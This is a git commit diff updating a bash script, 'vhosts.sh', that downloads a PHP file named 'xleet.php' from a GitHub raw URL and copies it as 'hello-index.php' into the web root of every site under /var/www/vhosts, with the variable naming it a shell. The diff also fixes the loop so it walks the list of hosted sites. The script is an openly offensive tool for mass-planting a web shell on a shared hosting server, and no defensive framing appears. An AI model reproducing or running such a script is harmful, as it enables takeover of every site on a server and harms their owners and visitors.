aecc5aeee1fd10338c3c34544b797ef7890fcd73
BETO <99655426+BETO-2FA@users.noreply.github.com>
2022-12-18 06:44:45 +0200

    Update vhosts.sh

--- vhosts.sh
+++ vhosts.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
 #love_betohat_"BAH"
-wget https://raw.githubusercontent.com/BETO-2FA/TXT-SOURCE/main/egy-batats.php -O /root/egy-batats.php
+wget https://raw.githubusercontent.com/BETO-2FA/TXT-SOURCE/main/xleet.php -O /root/egy-batats.php
 mkdir /tmp/hello-index
 ls -la /var/www/vhosts/ | awk '{print $9}' > /tmp/betobeh
-for i in `more /tmp/hello-index `
+for i in `more /tmp/betobeh`
 do
                 shell='hello-index.php'
                 cat /root/egy-batats.php > /var/www/vhosts/$i/httpdocs/$shell
